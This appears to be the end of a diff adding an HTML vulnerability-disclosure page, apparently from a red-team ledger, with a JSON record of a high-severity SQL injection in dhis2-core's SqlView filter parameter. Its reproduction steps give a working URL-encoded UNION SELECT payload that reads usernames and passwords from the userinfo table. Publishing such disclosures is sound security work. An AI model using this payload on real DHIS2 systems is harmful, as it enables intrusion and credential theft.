+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;dhis2-core&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Identify any SqlView {uid} the user can read.&#34;,
+    &#34;2. Send GET /api/sqlViews/{uid}/data?filter=1%3D1%20UNION%20SELECT%20username%2Cpassword%20FROM%20userinfo--:eq:x&#34;,
+    &#34;3. The column name &#39;1=1 UNION SELECT username,password FROM userinfo--&#39; is concatenated into the WHERE clause; &#39;--&#39; comments out the remainder of the generated SQL.&#34;,
+    &#34;4. Read the injected userinfo rows from the returned Grid response.&#34;
+  ],
+  &#34;technical_details&#34;: &#34;getFilterQuery() builds the clause as `filter += sqlHelper.whereAnd() + \&#34; \&#34; + columnName + \&#34; \&#34; + operatorWithPlaceholder`, where columnName is split[0] taken directly from the user-supplied filter parameter with no regex check, allowlist, or quoting. The resulting string is passed to jdbcTemplate.queryForRowSet(sql, args) in HibernateSqlViewStore.populateSqlViewGrid(), so attacker-controlled SQL executes verbatim.&#34;,
+  &#34;title&#34;: &#34;SQL Injection via Unquoted Column Name in SqlView Filter Parameter&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
